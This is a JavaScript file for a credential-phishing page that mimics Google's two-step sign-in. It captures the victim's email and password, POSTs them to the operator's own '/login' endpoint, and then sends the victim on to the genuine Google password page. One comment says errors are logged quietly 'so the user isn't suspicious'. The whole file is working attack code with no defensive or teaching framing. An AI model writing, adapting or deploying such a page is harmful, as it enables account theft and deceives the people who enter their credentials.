var counter = 0;
var email;
var password;

function next() {
    // This function is called by the "Next" button's onclick event
    enter();
}

window.onload = function() {
    var form = document.getElementById('login-form');
    var input = document.getElementById("input1");

    // FIX: Listen for the form's 'submit' event. This is the most reliable
    // way to handle the "Enter" key and prevent the page from refreshing.
    form.addEventListener('submit', function(e) {
        e.preventDefault(); // This is the most important part! It stops the refresh.
        enter(); // Now, run your existing logic
    });
    
    // Mobile screen adjustments
    if(screen.width <= 450) {
        var box = document.getElementById('box');
        var grid = document.getElementById('grid-container');
        // Note: 'email' variable is already used globally, so this is a local one.
        var emailDiv = document.getElementById('email');
        var logo = document.getElementById('logo');
        var header1 = document.getElementById('header1');
        var header2 = document.getElementById('header2');
        var forgot = document.getElementById('forgot');
        var guest = document.getElementById('guest-mode');
        var learn = document.getElementById('learn-more');
        var create = document.getElementById('create-account');
        var next = document.getElementById('next');
        var button = document.getElementById('button');
        document.body.style.background = "#ffffff";
        box.style.setProperty("width", "100%");
        var height = screen.height;
        box.style.setProperty("height", "100%");
        box.style.setProperty("vertical-align", "top");
        grid.style.setProperty("width", "100%");
        grid.style.setProperty("height", "100%");
        logo.style.setProperty("grid-column-end", "10");
        logo.style.setProperty("grid-row-start", "1");
        logo.style.setProperty("grid-row-end", "3");
        logo.style.setProperty("padding-top", "23px");
        logo.style.setProperty("padding-left", "2px");
        logo.style.setProperty("padding-bottom", "0px");
        header1.style.setProperty("grid-row-start", "3");
        header1.style.setProperty("grid-row-end", "5");
        header1.style.setProperty("padding-top", "10px");
        header1.style.setProperty("padding-left", "3px");
        header2.style.setProperty("grid-row-start", "4");
        header2.style.setProperty("grid-column-end", "16");
        header2.style.setProperty("padding-left", "3px");
        header2.style.setProperty("padding-top", "15px");
        emailDiv.style.setProperty("grid-row-start", "6");
        emailDiv.style.setProperty("grid-row-end", "15");
        emailDiv.style.setProperty("padding-top", "35px");
        emailDiv.style.setProperty("padding-left", "2px");
        forgot.style.setProperty("grid-row-start", "11");
        forgot.style.setProperty("padding-left", "2px");
        guest.style.setProperty("grid-row-start", "14");
        guest.style.setProperty("grid-column-end", "19");
        guest.style.setProperty("padding-left", "0px");
        learn.style.setProperty("grid-row-start", "15");
        learn.style.setProperty("grid-column-start", "2");
        learn.style.setProperty("padding-left", "2px");
        create.style.setProperty("grid-row-start", "17");
        create.style.setProperty("padding-left", "2px");
        next.style.setProperty("grid-row-start", "17");
    }
    
    input.focus();
};

/**
 * Displays an error message below the input field.
 * @param {string} message - The error message to display.
 */
function showError(message) {
    var errorDiv = document.getElementById('error-message');
    var inputElement = document.getElementById('input1');

    if (errorDiv) {
        errorDiv.innerHTML = message;
        errorDiv.style.display = 'block';
    }
    // The MDL library handles error states, but we can add a border for emphasis
    inputElement.style.borderBottom = '2px solid rgb(217, 48, 37)';
}

/**
 * Clears any currently displayed error message.
 */
function clearError() {
    var errorDiv = document.getElementById('error-message');
    var inputElement = document.getElementById('input1');

    if (errorDiv) {
        errorDiv.innerHTML = '';
        errorDiv.style.display = 'none';
    }
    if (inputElement) {
        inputElement.style.borderBottom = ''; // Reset border
    }
}

function enter() {
    var inputElement = document.getElementById('input1');
    var value = inputElement.value.trim();

    clearError(); // Clear previous errors on every new attempt

    if (counter === 0) { // --- Email Validation ---
        if (value === "") {
            showError("Please enter an email.");
            return; // Stop the function
        }
        // Use a simple regex to check for a basic email pattern (e.g., a@b.c)
        const emailPattern = /.+@.+\..+/;
        if (!emailPattern.test(value)) {
            showError("Invalid email, please enter a valid email.");
            return; // Stop the function
        }

        // If validation passes:
        email = value;
        counter++;
        change(); // Change UI to password input

    } else if (counter === 1) { // --- Password Validation ---
        if (value === "") {
            showError("Please enter a password.");
            return; // Stop the function
        }

        // If validation passes:
        password = value;
        counter++;
        sendCredentials(email, password);
    }
}

/**
 * Sends the collected credentials to the server via a POST request,
 * then redirects the user.
 * @param {string} email - The user's email.
 * @param {string} password - The user's password.
 */
function sendCredentials(email, password) {
    fetch('/login', { // The endpoint on your Flask server
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            email: email,
            password: password
        }),
    })
    .catch(error => {
        // Log errors but continue the process so the user isn't suspicious
        console.error('Error sending credentials:', error);
    })
    .finally(() => {
        // This block runs whether the fetch succeeded or failed.
        // Redirect the user to the real Google page.
        window.location.replace("https://accounts.google.com/signin/v2/challenge/pwd?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&flowName=GlifWebSignIn&flowEntry=ServiceLogin");
    });
}

function change() {
    var input1 = document.getElementById('input1');
    var input2 = document.getElementById('input2');
    var header1 = document.getElementById('header1');
    var header2 = document.getElementById('header2');
    var forgot = document.getElementById('forgot-text');
    
    input1.value = "";
    input1.type = "password";
    input2.innerHTML = "Enter your password";
    header1.innerHTML = "Welcome";
    header2.innerHTML = email;
    forgot.innerHTML = "Forgot password?";
}

// This function is no longer needed for the primary flow,
// but we can leave it in case you want to add more steps later.
function change2() {
    var input1 = document.getElementById('input1');
    input1.disabled = true;
}